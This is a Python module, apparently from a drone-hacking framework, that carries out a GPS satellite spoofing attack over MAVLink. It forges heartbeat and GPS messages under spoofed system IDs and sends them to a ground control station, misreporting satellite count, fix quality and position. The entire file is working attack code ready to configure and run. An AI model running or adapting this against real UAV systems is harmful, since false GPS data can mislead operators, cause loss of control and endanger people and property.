from sploitkit import Config, Option
from lib.base import MAVLinkModule
from pymavlink import mavutil
import time
import random
import os

# Force MAVLink 2.0 (critical for proper message routing)
os.environ['MAVLINK20'] = '1'

class SatelliteSpoofing(MAVLinkModule):
    """
    Spoof GPS satellite information to mislead the Ground Control Station (GCS)
    about the number of visible satellites and GPS signal quality.

    Connection:
        For spoofing, use 'udpout:' to send TO the target port:
        - Network (recommended): udpout:10.13.0.6:14550
        - Network (bidirectional): udp:10.13.0.6:14550
        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)

    Usage:
        set connection udpout:10.13.0.6:14550
        set satellites 0
        set fix_type 0
        run
    """

    # Inherit connection config from base class and add module-specific options
    config = MAVLinkModule.config + Config({
        Option(
            name='satellites',
            description='Number of visible satellites to spoof (0-20)',
            required=True,
        ): "0",  # Default: No satellites
        Option(
            name='fix_type',
            description='GPS fix type: 0=No Fix, 1=No Fix, 2=2D, 3=3D, 4=DGPS, 5=RTK Float, 6=RTK Fixed',
            required=False,
        ): "0",  # Default: No fix
        Option(
            name='latitude',
            description='Spoofed latitude in degrees * 1E7 (e.g., 377490000 for 37.749°)',
            required=False,
        ): "0",
        Option(
            name='longitude',
            description='Spoofed longitude in degrees * 1E7 (e.g., -1221940000 for -122.194°)',
            required=False,
        ): "0",
        Option(
            name='altitude',
            description='Spoofed altitude in millimeters above mean sea level',
            required=False,
        ): "0",
        Option(
            name='eph',
            description='GPS HDOP horizontal dilution of position (cm). 0-65535, lower is better',
            required=False,
        ): "9999",  # Poor accuracy
        Option(
            name='epv',
            description='GPS VDOP vertical dilution of position (cm). 0-65535, lower is better',
            required=False,
        ): "9999",  # Poor accuracy
        Option(
            name='cog',
            description='Course over ground in degrees * 100 (0-36000)',
            required=False,
        ): "0",
        Option(
            name='velocity',
            description='GPS ground speed in cm/s',
            required=False,
        ): "0",
        Option(
            name='duration',
            description='Duration of spoofing in seconds (0 for infinite)',
            required=False,
        ): "60",
        Option(
            name='update_rate',
            description='GPS update rate in Hz',
            required=False,
        ): "1",  # Default: 1 Hz
        Option(
            name='src_system_id',
            description='Source system ID to spoof (what system the message appears from)',
            required=False,
        ): "1",  # Default: System 1
        Option(
            name='src_component_id',
            description='Source component ID to spoof (what component the message appears from)',
            required=False,
        ): "1",  # Default: Component 1
        Option(
            name='tgt_system_id',
            description='Target system ID (who to send to, 0 for broadcast)',
            required=False,
        ): "0",  # Default: Broadcast
        Option(
            name='tgt_component_id',
            description='Target component ID (which component to target, 0 for broadcast)',
            required=False,
        ): "0",  # Default: Broadcast
    })

    def send_heartbeat(self, master):
        """
        Send a MAVLink heartbeat message.
        """
        master.mav.heartbeat_send(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,  # GUIDED mode
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )

    def send_gps_raw_int(self, master, satellites, fix_type, lat, lon, alt, eph, epv, vel, cog):
        """
        Send a MAVLink GPS_RAW_INT message with spoofed satellite count.
        """
        time_usec = int(time.time() * 1e6)

        master.mav.gps_raw_int_send(
            time_usec=time_usec,
            fix_type=fix_type,
            lat=lat,
            lon=lon,
            alt=alt,
            eph=eph,
            epv=epv,
            vel=vel,
            cog=cog,
            satellites_visible=satellites
        )

    def send_gps_status(self, master, satellites):
        """
        Send a MAVLink GPS_STATUS message with detailed satellite information.
        """
        # Generate random but realistic satellite data
        satellite_prn = []
        satellite_used = []
        satellite_elevation = []
        satellite_azimuth = []
        satellite_snr = []

        for i in range(20):  # GPS_STATUS supports up to 20 satellites
            if i < satellites:
                # Active satellite
                satellite_prn.append(i + 1)
                satellite_used.append(1)
                satellite_elevation.append(random.randint(10, 90))
                satellite_azimuth.append(random.randint(0, 359))
                satellite_snr.append(random.randint(15, 45))
            else:
                # No satellite
                satellite_prn.append(0)
                satellite_used.append(0)
                satellite_elevation.append(0)
                satellite_azimuth.append(0)
                satellite_snr.append(0)

        master.mav.gps_status_send(
            satellites_visible=satellites,
            satellite_prn=satellite_prn,
            satellite_used=satellite_used,
            satellite_elevation=satellite_elevation,
            satellite_azimuth=satellite_azimuth,
            satellite_snr=satellite_snr
        )

    def run(self):
        # Retrieve configuration options
        satellites = int(self.config['satellites'])
        fix_type = int(self.config['fix_type'])
        latitude = int(self.config['latitude'])
        longitude = int(self.config['longitude'])
        altitude = int(self.config['altitude'])
        eph = int(self.config['eph'])
        epv = int(self.config['epv'])
        cog = int(self.config['cog'])
        velocity = int(self.config['velocity'])
        duration = int(self.config['duration'])
        update_rate = int(self.config['update_rate'])
        src_system_id = int(self.config['src_system_id'])
        src_component_id = int(self.config['src_component_id'])
        tgt_system_id = int(self.config['tgt_system_id'])
        tgt_component_id = int(self.config['tgt_component_id'])

        # Validate satellite count
        if satellites < 0 or satellites > 20:
            self.logger.error("Satellite count must be between 0 and 20")
            return

        separator = "=" * 80
        self.logger.info(separator)
        self.logger.info("GPS Satellite Spoofing Attack")
        self.logger.info(separator)
        self.logger.warning("This will inject false GPS satellite data into the MAVLink stream")
        self.logger.info(f"Spoofed Satellites: {satellites}")
        self.logger.info(f"GPS Fix Type: {fix_type}")
        if latitude != 0 or longitude != 0:
            self.logger.info(f"Position: Lat={latitude/1e7:.6f}°, Lon={longitude/1e7:.6f}°, Alt={altitude/1000:.1f}m")
        self.logger.info(f"HDOP (horizontal accuracy): {eph} cm")
        self.logger.info(f"VDOP (vertical accuracy): {epv} cm")
        self.logger.info(f"Update Rate: {update_rate} Hz")
        self.logger.info(f"Source: System ID {src_system_id}, Component ID {src_component_id}")
        self.logger.info(f"Target: System ID {tgt_system_id}, Component ID {tgt_component_id}")
        if duration > 0:
            self.logger.info(f"Duration: {duration} seconds")
        else:
            self.logger.info("Duration: Infinite (Ctrl+C to stop)")
        self.logger.info(separator)

        if satellites == 0:
            self.logger.warning("WARNING: 0 satellites will indicate complete GPS failure!")
        elif satellites < 4:
            self.logger.warning(f"WARNING: {satellites} satellites may cause GPS lock loss!")

        master = None
        try:
            # Connect to the MAVLink device (supports both serial and network)
            master = self.connect_drone()

            # Set spoofed source and target IDs
            master.source_system = src_system_id
            master.source_component = src_component_id
            master.target_system = tgt_system_id
            master.target_component = tgt_component_id

            start_time = time.time()
            count = 0
            interval = 1.0 / update_rate

            # Main spoofing loop
            while True:
                # Check if the duration has been reached
                if duration > 0 and (time.time() - start_time >= duration):
                    self.logger.info(f"Spoofing duration of {duration} seconds reached. Stopping...")
                    break

                # Send spoofed GPS messages
                self.send_heartbeat(master)
                self.send_gps_raw_int(master, satellites, fix_type, latitude, longitude,
                                     altitude, eph, epv, velocity, cog)
                self.send_gps_status(master, satellites)

                count += 1

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Sent {count * 3} spoofed GPS packets ({elapsed:.1f}s elapsed)")

                time.sleep(interval)

            self.logger.success(f"\n{separator}")
            self.logger.success(f"Satellite Spoofing Attack Completed")
            self.logger.success(f"Total packets sent: {count * 3}")
            self.logger.success(f"{separator}")

        except KeyboardInterrupt:
            self.logger.info("\n\nAttack interrupted by user")
        except Exception as e:
            self.logger.error(f"Error during spoofing: {str(e)}")
            import traceback
            self.logger.error(traceback.format_exc())
        finally:
            # Clean up connection
            self.close_connection(master)
